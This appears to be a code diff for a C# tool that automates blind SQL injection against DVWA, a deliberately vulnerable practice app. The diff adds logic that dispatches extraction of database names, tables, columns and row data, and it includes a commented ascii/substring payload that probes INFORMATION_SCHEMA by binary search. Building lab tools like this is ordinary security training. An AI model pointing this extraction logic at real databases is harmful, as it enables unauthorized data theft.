@@ -37,10 +37,11 @@ namespace Tool_SqlInjectionBlind_Dvwa
             //"1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_NAME>'u' LIMIT 1), 1,1))) >= 124 #";
             sql = sql.Substring(0, sql.LastIndexOf(">= ") + 3);
             sql += (Mid(left, right) + " #");
+
             return sql;
         }
 
-        public static ResultRequest.Job CheckRespond(ResultRequest.Result result, ResultRequest.Mode mode, ResultRequest.Mode_SQL mode_sql,
+        public static ResultRequest.Job Respond(ResultRequest.Result result, ResultRequest.Mode mode, ResultRequest.Mode_SQL mode_sql,
             ref string sql, ref int left, ref int right, ref int mid, ref string str_result)
         {
             if (result == ResultRequest.Result.Exists)
@@ -92,7 +93,58 @@ namespace Tool_SqlInjectionBlind_Dvwa
             }
         }
 
-        public static string  Next_Char_Sql(this string sql, ResultRequest.Mode_SQL mode_sql, ref int index)
+        public static ResultRequest.Job Get_Result_Respond(ResultRequest.Result result,
+             ref string sql, ref int left, ref int right, ref int mid, ref string str_result)
+        {
+            ResultRequest.Job work_state = ResultRequest.Job.None;
+            if (Confirm.Is_Click_btnGDatabaseName)
+            {
+                work_state = Handing.Respond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DB_Name,
+                    ref sql, ref left, ref right, ref mid, ref str_result);
+            }
+            else if (Confirm.Is_Click_btnGNameTables)
+            {
+                if (Confirm.Count_Tables_Done)
+                {
+                    work_state = Handing.Respond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.TABLES_NAME,
+                        ref sql, ref left, ref right, ref mid, ref str_result);
+                }
+                else
+                {
+                    work_state = Handing.Respond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.TABLES_NAME,
+                        ref sql, ref left, ref right, ref mid, ref str_result);
+                }
+            }
+            else if (Confirm.Is_Click_btnGNameColumns)
+            {
+                if (Confirm.Find_Quantity_Done)
+                {
+                    work_state = Handing.Respond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.COLUMNS_NAME,
+                        ref sql, ref left, ref right, ref mid, ref str_result);
+                }
+                else
+                {
+                    work_state = Handing.Respond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.COLUMNS_NAME,
+                       ref sql, ref left, ref right, ref mid, ref str_result);
+                }
+            }
+            else if (Confirm.Is_Click_btnGetData)
+            {
+                if (!Confirm.Find_Quantity_Row_Done.Contains(false))
+                {
+                    work_state = Handing.Respond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DATA_TABLE,
+                        ref sql, ref left, ref right, ref mid, ref str_result);
+                }
+                else
+                {
+                    work_state = Handing.Respond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.DATA_TABLE,
+                        ref sql, ref left, ref right, ref mid, ref str_result);
+                }
+            }
+            return work_state;
+        }
+
+        public static string Next_Char_Sql(this string sql, ResultRequest.Mode_SQL mode_sql, ref int index)
         {
             if(mode_sql == ResultRequest.Mode_SQL.DB_Name)
             {
@@ -147,6 +199,14 @@ namespace Tool_SqlInjectionBlind_Dvwa
                 return sql;
             }
             return sql;
+        }
+
+        public static string Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL mode_sql)
+        {
+            int index = Variable.Index_str;
+            Variable.Sql_Request = Variable.Sql_Request.Next_Char_Sql(mode_sql, ref index);
+            Variable.Index_str = index;
+            return Variable.Sql_Request;
         }
     }
 }
